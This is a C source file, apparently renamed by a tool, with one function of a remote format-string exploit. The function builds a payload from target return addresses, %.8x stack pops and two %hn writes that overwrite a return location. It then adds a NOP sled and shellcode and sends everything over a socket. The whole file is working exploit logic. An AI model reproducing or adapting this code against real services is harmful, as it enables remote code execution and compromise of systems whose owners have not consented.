#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int retloc; int retaddr; } ;

/* Variables and functions */
 scalar_t__ FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 char* FUNC5 (char*,int) ; 
 int FUNC6 (int,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*,unsigned long) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 int FUNC10 (char*) ; 
 TYPE_1__* targets ; 

int FUNC11(int sock,int iType)
{
    int offset = 0x11;
    int dump_fmt=7;
    int al = 3;
    int hi,lo;
    int x;
    int ret;
    unsigned long shift0,shift1;
    char    buf[90000];
    char    fun[256];
    char *ptr;


    /* check zero byte */
    if (FUNC0 (targets[iType].retloc) || FUNC0 (targets[iType].retloc+2) ) {
        FUNC4 ("retloc has a null; <\n");
        FUNC1 (1);
    }

    hi = (targets[iType].retaddr >> 0) & 0xffff;
    lo = (targets[iType].retaddr >> 16) & 0xffff;


    shift0 = hi - offset - (dump_fmt * 8 + 16 + al);
    shift1 = (0x10000 +  lo) - hi;

    FUNC3(buf,0x41,3);
    ptr = buf+3;
    ptr = FUNC5 (ptr, 0x42424242);
    ptr = FUNC5 (ptr, targets[iType].retloc);
    ptr = FUNC5 (ptr, 0x42424242);
    ptr = FUNC5 (ptr, targets[iType].retloc+2);

    for (x=0;x<dump_fmt;x++)
        FUNC9(ptr,"%.8x");

    FUNC9(ptr,"%.");
    FUNC8(ptr+FUNC10(ptr),"%u",shift0);
    FUNC9(ptr,"lx%hn");

    FUNC9(ptr,"%.");
    FUNC8(ptr+FUNC10(ptr),"%u",shift1);
    FUNC9(ptr,"lx%hn");
    x = FUNC10(ptr);
    FUNC3(ptr+x,0x90,3000);
    x+=3000;
    FUNC2(ptr+x,shellcode,337);
    x+=337;

    FUNC4 ("# send exploit data. \n");
    FUNC7(1);
    ret = FUNC6 (sock, buf, x, 0);
    FUNC4 ("[*] data sent %d bytes .\n", x);
    FUNC2(fun,"l\n",2);
    ret = FUNC6 (sock, fun, 2, 0);
    FUNC4 ("[*] data sent %d bytes .\n", ret);
    
    return 0;
}